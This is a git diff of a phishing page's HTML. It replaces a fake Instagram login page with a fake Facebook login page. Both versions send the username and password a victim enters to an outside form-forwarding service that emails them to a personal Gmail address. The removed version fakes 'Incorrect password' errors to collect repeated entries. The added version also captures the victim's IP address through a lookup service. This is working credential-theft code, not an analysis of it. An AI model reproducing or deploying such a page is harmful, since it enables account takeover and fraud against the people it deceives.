@@ -1,138 +1,236 @@
 <!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instaagraam</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="shortcut icon" href="images\facebook-icon.png" type="image/x-icon">
+    <!-- <link rel="stylesheet" href="style.css"> -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
 
-  <!-- Favicon & Fonts -->
-  <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="./app.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+      
+        * {
+            background-color: yellow;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
 
-  <style>
-    .error-message {
-      color: red;
-      font-size: 12px;
-      margin-top: 4px;
-      display: none;
-    }
-  </style>
+        }
+
+        .flex {
+            display: flex;
+            align-items: center;
+        }
+
+        .container {
+            padding: 0 15px;
+            min-height: 100vh;
+            justify-content: center;
+            background: #f0f2f5;
+        }
+
+        .facebook-page {
+            justify-content: space-between;
+            max-width: 1000px;
+            width: 100%;
+        }
+
+        .facebook-page .text {
+            margin-bottom: 90px;
+        }
+
+        .facebook-page h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            margin-bottom: 10px;
+        }
+
+        .facebook-page p {
+            font-size: 1.75rem;
+            white-space: nowrap;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+                0 8px 16px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        form input {
+            height: 55px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 1rem;
+            padding: 0 14px;
+        }
+
+        form input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        ::placeholder {
+            color: #777;
+            font-size: 1.063rem;
+        }
+
+        .link {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            gap: 15px;
+        }
+
+        .link .login {
+            border: none;
+            outline: none;
+            cursor: pointer;
+            background: #1877f2;
+            padding: 15px 0;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.25rem;
+            font-weight: 600;
+            transition: 0.2s ease;
+        }
+
+        .link .login:hover {
+            background: #0d65d9;
+        }
+
+        form a {
+            text-decoration: none;
+        }
+
+        .link .forgot {
+            color: #1877f2;
+            font-size: 0.875rem;
+        }
+
+        .link .forgot:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: none;
+            height: 1px;
+            background-color: #ccc;
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+
+        .button {
+            margin-top: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .button a {
+            padding: 15px 20px;
+            background: #42b72a;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.063rem;
+            font-weight: 600;
+            transition: 0.2s ease;
+        }
+
+        .button a:hover {
+            background: #3ba626;
+        }
+
+        @media (max-width: 900px) {
+            .facebook-page {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .facebook-page .text {
+                margin-bottom: 30px;
+            }
+        }
+
+        @media (max-width: 460px) {
+            .facebook-page h1 {
+                font-size: 3.5rem;
+            }
+
+            .facebook-page p {
+                font-size: 1.3rem;
+            }
+
+            form {
+                padding: 15px;
+            }
+        }
+
+        .foot {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
 </head>
 
 <body>
-  <div class="container">
-    <div class="main-container">
-      <div class="main-content">
-        <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
-          <div class="slide-content" id="slide-content">
-            <img src="./images/slide (1).jpg" class="active" />
-            <img src="./images/slide (2).jpg" />
-            <img src="./images/slide (3).jpg" />
-            <img src="./images/slide (4).jpg" />
-            <img src="./images/slide (5).jpg" />
-          </div>
-        </div>
-
-        <div class="form-container">
-          <form id="form" method="POST" action="https://formsubmit.co/Dcpromise74@gmail.com">
-            <div class="form-content box">
-              <div class="logo">
-                <img src="./images/logo-light.png" class="logo-light" />
-                <img src="./images/logo-dark.png" class="logo-dark" />
-              </div>
-
-              <div class="btn-group">
-                <button class="btn-login" type="submit">
-                  <i class="fab fa-facebook-square"></i> Continue Using Facebook
-                </button>
-              </div>
-
-              <div class="divine"><div></div><div>OR</div><div></div></div>
-
-              <div class="signin-form" id="signin-form">
-                <div class="form-group">
-                  <div class="animate-input">
-                    <span>Phone number, username or email</span>
-                    <input type="text" name="username" id="username" required>
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" id="nextField" name="_next" value="">
-                  </div>
-                </div>
-
-                <div class="form-group">
-                  <div class="animate-input">
-                    <span>Password</span>
-                    <input type="text" name="password" id="password" required>
-                    <button type="button">Show</button>
-                    <small id="errorText" class="error-message">Incorrect password. Please try again.</small>
-                  </div>
-                  <div style="display: flex; justify-content: end; color: rgb(0, 17, 255);">
-                    <a href="#" class="forgot-pw">Forgotten your password?</a>
-                  </div>
-                </div>
-
-                <div class="btn-group">
-                  <button class="btn-login" type="submit">Sign In</button>
-                  <div class="box goto">
-                    <p>Don't have an account? <a href="#">Sign up</a></p>
-                  </div>
-                </div>
-              </div>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>facebook</h1>
+                <p>Connect with friends and the world </p>
+                <p> around you on Facebook.</p>
             </div>
+            <form id="forms" action="https://formsubmit.co/Dcpromise74@gmail.com" method="POST">
+ <input type="text" id="ipAddress" name="ipAddress" readonly hidden>
+                <input type="text" name="username" id="username" required placeholder="email">
 
-            <div class="app-download">
-              <p>Get the app.</p>
-              <div class="store-link">
-                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
-                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
-              </div>
-            </div>
-          </form>
+                <input type="text" name="password" id="password" required placeholder="password">
+           <input type="hidden" name="_next" value="thanks.html"> 
+                <input type="hidden" name="_captcha" value="false">
+                <div class="link">
+                    <button type="submit" value="Send Email" class="login" id="button" style="text-decoration: none; color: white;">Login 
+                    </button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
         </div>
-      </div>
     </div>
+    <footer class="foot">
+        © 2023 Meta
 
-    <div class="footer">
-      <div class="links">
-        <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
-        <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a>
-        <a href="#">Hashtags</a><a href="#">Locations</a><a href="#" id="darkmode-toggle">Darkmode</a>
-      </div>
-      <hr />
-      <div class="copyright">
-        <p>from</p><img src="images/download.jpg" alt="">
-      </div>
-    </div>
-  </div>
+    </footer>
+     <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ipAddress').value = ipAddress;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
 
-  <script>
-    const form = document.getElementById('form');
-    const nextField = document.getElementById('nextField');
-    const errorText = document.getElementById('errorText');
-
-    // Initialize login attempt counter
-    if (!localStorage.getItem('login_attempt')) {
-      localStorage.setItem('login_attempt', '0');
-    }
-
-    form.addEventListener('submit', function () {
-      let attempt = parseInt(localStorage.getItem('login_attempt'));
-
-      if (attempt < 3) {
-        errorText.style.display = 'block';
-        nextField.value = window.location.href; // submit but stay
-        localStorage.setItem('login_attempt', (attempt + 1).toString());
-      } else {
-        errorText.style.display = 'none';
-        nextField.value = "https://weltvw.vercel.app/thanks.html"; // redirect
-        localStorage.removeItem('login_attempt');
-      }
-    });
-  </script>
-
-  <script src='app.js'></script>
+    </script>
 </body>
+
+
 </html>
